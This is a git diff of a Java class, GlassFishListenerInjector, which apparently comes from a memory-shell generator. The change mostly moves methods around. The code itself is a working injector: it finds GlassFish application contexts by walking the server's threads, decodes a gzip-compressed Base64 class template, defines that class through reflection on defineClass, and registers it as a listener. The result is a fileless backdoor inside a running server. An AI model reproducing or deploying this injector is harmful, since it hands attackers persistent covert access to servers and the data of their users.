@@ -18,19 +18,11 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  */
 public class GlassFishListenerInjector {
-    Logger log = Logger.getLogger(GlassFishListenerInjector.class.getName());
-
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() throws IOException {
-        return "{{base64Str}}";
-    }
-
     static {
         new GlassFishListenerInjector();
     }
+
+    Logger log = Logger.getLogger(GlassFishListenerInjector.class.getName());
 
     public GlassFishListenerInjector() {
         try {
@@ -44,75 +36,6 @@ public class GlassFishListenerInjector {
         }
 
     }
-
-    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        try {
-            for (Thread thread : threads) {
-                if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                    Map<?, ?> childrenMap = (Map<?, ?>) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
-                    for (Object key : childrenMap.keySet()) {
-                        Map<?, ?> children = (Map<?, ?>) getFV(childrenMap.get(key), "children");
-                        for (Object key1 : children.keySet()) {
-                            Object context = children.get(key1);
-                            if (context != null) {
-                                contexts.add(context);
-                            }
-                        }
-                    }
-                }
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        return contexts;
-    }
-
-    private Object getListener(Object context) throws Exception {
-        Object listener = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
-
-        try {
-            listener = classLoader.loadClass(getClassName()).newInstance();
-        } catch (Exception e) {
-            try {
-                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
-                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineClass.setAccessible(true);
-                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                listener = clazz.newInstance();
-            } catch (Exception ignored) {
-            }
-
-        }
-        return listener;
-    }
-
-    public void addListener(Object context, Object listener) throws Exception {
-        try {
-            List<EventListener> eventListeners = (List<EventListener>) invokeMethod(context, "getApplicationEventListeners");
-            boolean isExist = false;
-            for (EventListener eventListener : eventListeners) {
-                if (eventListener.getClass().getName().equals(listener.getClass().getName())) {
-                    isExist = true;
-                    break;
-                }
-            }
-            if (!isExist) {
-                log.info("listener added successfully");
-                eventListeners.add((EventListener) listener);
-            }else{
-                log.warning("listener already exists");
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
 
     static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
         Class<?> decoderClass;
@@ -201,6 +124,82 @@ public class GlassFishListenerInjector {
             } catch (IllegalAccessException e) {
                 throw new RuntimeException(e.getMessage());
             }
+        }
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
+
+    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
+        List<Object> contexts = new ArrayList<Object>();
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
+        try {
+            for (Thread thread : threads) {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    Map<?, ?> childrenMap = (Map<?, ?>) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
+                    for (Object key : childrenMap.keySet()) {
+                        Map<?, ?> children = (Map<?, ?>) getFV(childrenMap.get(key), "children");
+                        for (Object key1 : children.keySet()) {
+                            Object context = children.get(key1);
+                            if (context != null) {
+                                contexts.add(context);
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return contexts;
+    }
+
+    private Object getListener(Object context) throws Exception {
+        Object listener = null;
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+        if (classLoader == null) {
+            classLoader = context.getClass().getClassLoader();
+        }
+
+        try {
+            listener = classLoader.loadClass(getClassName()).newInstance();
+        } catch (Exception e) {
+            try {
+                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                defineClass.setAccessible(true);
+                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+                listener = clazz.newInstance();
+            } catch (Exception ignored) {
+            }
+
+        }
+        return listener;
+    }
+
+    public void addListener(Object context, Object listener) throws Exception {
+        try {
+            List<EventListener> eventListeners = (List<EventListener>) invokeMethod(context, "getApplicationEventListeners");
+            boolean isExist = false;
+            for (EventListener eventListener : eventListeners) {
+                if (eventListener.getClass().getName().equals(listener.getClass().getName())) {
+                    isExist = true;
+                    break;
+                }
+            }
+            if (!isExist) {
+                log.info("listener added successfully");
+                eventListeners.add((EventListener) listener);
+            } else {
+                log.warning("listener already exists");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 }
